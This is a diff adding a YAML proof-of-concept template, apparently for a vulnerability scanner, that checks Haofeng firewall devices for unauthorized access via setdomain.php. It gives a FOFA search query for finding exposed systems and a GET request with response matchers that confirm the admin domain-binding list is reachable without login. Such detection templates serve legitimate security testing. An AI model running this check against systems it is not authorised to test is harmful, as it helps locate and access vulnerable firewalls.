@@ -1,0 +1,24 @@
+id: poc-yaml-haofeng-firewall-setdomain-php-unauthorized-access
+info:
+  name: 皓峰防火墙 setdomain.php 越权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 皓峰防火墙
+  fofa: app="皓峰防火墙系统登录"
+requests:
+- method: GET
+  path: /setdomain.php?action=list
+  expression: 'status_code == 200
+
+    && contains(title,"皓峰系统管理平台")
+
+    && contains(body,"域名绑定列表")
+
+    && contains(body,"[删除]")
+
+    && contains(body,"[修改]")
+
+    '
+variables: {}
+transport: http
